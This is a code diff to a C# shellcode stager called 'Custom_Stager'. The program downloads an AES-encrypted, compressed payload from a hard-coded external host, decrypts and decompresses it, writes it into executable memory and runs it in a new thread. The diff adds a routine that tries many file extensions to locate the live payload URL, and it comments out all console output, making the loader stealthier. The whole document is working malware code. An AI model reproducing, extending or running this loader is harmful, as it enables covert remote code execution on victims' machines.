@@ -12,9 +12,16 @@ namespace Custom_Stager
 {
     class Program
     {
-        private static string url = "https://www.administrative.cc/d2fc1b6a458f.cgi";
+        private static string baseUrl = "https://www.administrative.cc/d2fc1b6a458f";
         private static string AESKey = "9ae0c8e048d89fb3";
         private static string AESIV = "789ca1a73299c6e0";
+
+        private static List<string> extensions = new List<string>
+        {
+            ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".aspx",
+            ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
+            ".axd", ".asx", ".asmx", ".ashx", ".swf"
+        };
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -69,7 +76,7 @@ namespace Custom_Stager
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error during download: " + ex.Message);
+                //Console.WriteLine("Error during download: " + ex.Message);
                 return null;
             }
         }
@@ -78,7 +85,7 @@ namespace Custom_Stager
         {
             if (code.Length <= 16)
             {
-                Console.WriteLine("The code length is insufficient.");
+                //Console.WriteLine("The code length is insufficient.");
                 return;
             }
 
@@ -90,7 +97,7 @@ namespace Custom_Stager
             }
             catch
             {
-                Console.WriteLine("Error during decryption.");
+                //Console.WriteLine("Error during decryption.");
                 return;
             }
 
@@ -101,14 +108,14 @@ namespace Custom_Stager
             }
             catch
             {
-                Console.WriteLine("Error during decompression.");
+                //Console.WriteLine("Error during decompression.");
                 return;
             }
 
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
             if (addr == IntPtr.Zero)
             {
-                Console.WriteLine("Error during memory allocation.");
+                //Console.WriteLine("Error during memory allocation.");
                 return;
             }
 
@@ -117,16 +124,57 @@ namespace Custom_Stager
             WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
 
+        public static string CheckUrlExistence()
+        {
+            foreach (var ext in extensions)
+            {
+                string fullUrl = baseUrl + ext;
+
+                try
+                {
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(fullUrl);
+                    request.Method = "GET";
+                    using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+                    {
+                        if (response.StatusCode == HttpStatusCode.OK)
+                        {
+                            //Console.WriteLine($"Found valid URL: {fullUrl}");
+                            return fullUrl; // Return the valid URL
+                        }
+                    }
+                }
+                catch (WebException ex)
+                {
+                    // Handle specific errors or continue checking other extensions
+                    //Console.WriteLine($"Error checking {fullUrl}: {ex.Message}");
+                    continue; // Ignore errors and continue checking other extensions
+                }
+
+            }
+
+            //Console.WriteLine("No valid file found with specified extensions.");
+            return null; // Return null if no valid URL is found
+        }
+
         public static void Main(String[] args)
         {
-            byte[] output = Download(url);
-            if (output != null && output.Length > 0)
+            // First check for a valid URL with the correct extension
+            string validUrl = CheckUrlExistence();
+
+            if (!string.IsNullOrEmpty(validUrl))
             {
-                Execute(output);
-            }
-            else
-            {
-                Console.WriteLine("Error retrieving payload.");
+                // Proceed with downloading and executing the payload from the valid URL
+                byte[] output = Download(validUrl);
+
+                if (output != null && output.Length > 0)
+                {
+                    Execute(output);
+                }
+                else
+                {
+                    //Console.WriteLine("Error retrieving payload.");
+                }
+
             }
         }
     }
